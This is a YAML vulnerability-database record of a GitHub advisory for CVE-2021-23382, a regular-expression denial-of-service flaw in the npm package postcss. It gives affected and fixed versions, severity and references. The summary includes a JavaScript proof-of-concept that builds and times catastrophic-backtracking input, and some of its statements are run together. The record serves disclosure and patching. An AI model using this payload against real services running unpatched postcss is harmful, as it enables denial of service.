advisory_id: GHSA-566m-qj78-rww5
datasource_id: github_osv_importer_v2/GHSA-566m-qj78-rww5
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-566m-qj78-rww5/GHSA-566m-qj78-rww5.json
aliases:
  - CVE-2021-23382
summary: "Regular Expression Denial of Service in postcss\nThe package postcss versions before\
  \ 7.0.36 or between 8.0.0 and 8.2.13 are vulnerable to Regular Expression Denial of Service\
  \ (ReDoS) via getAnnotationURL() and loadAnnotation() in lib/previous-map.js. The vulnerable\
  \ regexes are caused mainly by the sub-pattern \n```regex\n\\/\\*\\s* sourceMappingURL=(.*)\n\
  ```\n\n### PoC\n```js\nvar postcss = require(\"postcss\")\nfunction build_attack(n) {\n  \
  \  var ret = \"a{}\"\n    for (var i = 0; i < n; i++) {\n        ret += \"/*# sourceMappingURL=\"\
  \n    }\n    return ret + \"!\";\n}\n```\n```js\npostcss.parse('a{}/*# sourceMappingURL=a.css.map\
  \ */') for (var i = 1; i <= 500000; i++) {\n    if (i % 1000 == 0) {\n        var time = Date.now();\n\
  \        var attack_str = build_attack(i) try {\n            postcss.parse(attack_str) var\
  \ time_cost = Date.now() - time;\n            console.log(\"attack_str.length: \" + attack_str.length\
  \ + \": \" + time_cost + \" ms\");\n        } catch (e) {\n            var time_cost = Date.now()\
  \ - time;\n            console.log(\"attack_str.length: \" + attack_str.length + \": \" +\
  \ time_cost + \" ms\");\n        }\n    }\n}\n```"
impacted_packages:
  - purl: pkg:npm/postcss
    affected_versions: vers:npm/>=8.0.0|<8.2.13
    fixed_versions: vers:npm/8.2.13
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/postcss
    affected_versions: vers:npm/<7.0.36
    fixed_versions: vers:npm/7.0.36
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '5.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/01/GHSA-566m-qj78-rww5/GHSA-566m-qj78-rww5.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-400
references:
  - url: https://github.com/postcss/postcss/commit/2b1d04c867995e55124e0a165b7c6622c1735956
    reference_type:
    reference_id:
  - url: https://github.com/postcss/postcss/releases/tag/7.0.36
    reference_type:
    reference_id:
  - url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1255641
    reference_type:
    reference_id:
  - url: https://snyk.io/vuln/SNYK-JS-POSTCSS-1255640
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2021-23382
    reference_type:
    reference_id: CVE-2021-23382
